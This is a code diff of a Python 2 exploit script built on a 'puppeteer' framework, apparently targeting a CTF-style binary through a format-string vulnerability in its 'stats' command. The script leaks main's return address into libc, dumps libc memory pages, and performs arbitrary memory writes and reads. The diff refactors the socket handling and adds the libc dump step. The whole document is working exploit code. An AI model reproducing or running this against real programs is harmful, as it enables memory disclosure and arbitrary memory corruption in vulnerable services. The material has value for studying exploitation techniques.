@@ -1,8 +1,6 @@
 import puppeteer
-import socket
 
 import logging
-import standard_logging
 
 class Aggravator(puppeteer.Manipulator):
     def __init__(self, host, port):
@@ -14,23 +12,21 @@ class Aggravator(puppeteer.Manipulator):
         self.locations['#main_end'] = 0x0804A9D1
         self.info['main_stackframe_size'] = 0x24
 
-        self.s = socket.create_connection((host, port))
-        self.f = self.s.makefile()
-        puppeteer.read_until(self.s, "> ")
+        self.c = puppeteer.Connection(host=host, port=port)
+        self.c.read_until("> ")
 
-    @puppeteer.printf_flags(byte_offset=244, max_length=31)
+    @puppeteer.printf_flags(byte_offset=244, max_length=31, forbidden={'\x00', '\x0a'})
     def stats_printf(self, fmt):
-        print "Sending:",fmt
-        self.s.sendall("stats " + fmt + "\n")
-        puppeteer.read_until(self.s, "kill top:\n")
+        self.c.send("stats " + fmt + "\n")
+        self.c.read_until("kill top:\n")
         try:
-            result = puppeteer.read_until(self.s, "\n"*5, timeout=3)[:-5]
-            puppeteer.read_until(self.s, "> ", timeout=3)
+            result = self.c.read_until("\n"*5, timeout=3)[:-5]
+            self.c.read_until("> ", timeout=3)
         except EOFError:
             print "Program didn't finish the print"
             return ""
 
-        print "RECEIVED:",result
+        #print "GOT:",repr(result)
         return result
 
 def main():
@@ -52,9 +48,14 @@ def main():
     lcsm = a.main_return_address(start_offset=390)
     print "main() will return to (presumably, this is in libc):",hex(lcsm)
 
+    # now dump it!
+    libc = a.dump_pageset(lcsm) #- 0x1000 # the minus is because on my test machine, the address has a \x00 in it
+    print "dumped %d pages from libc" % len(libc)
+
     # We can overwrite memory with ease!
-    a.do_memory_write(0x0804C344, "ABCD")
-    a.s.send("quit\n")
+    a.do_memory_write(0x0804C344, "OK")
+    assert a.do_memory_read(0x0804C344, 2) == "OK"
+    a.c.send("quit\n")
 
     #libc_page_start = lcsm & 0xfffff000
     #libc_page_content = a.do_memory_read(libc_page_start, 0x1000)
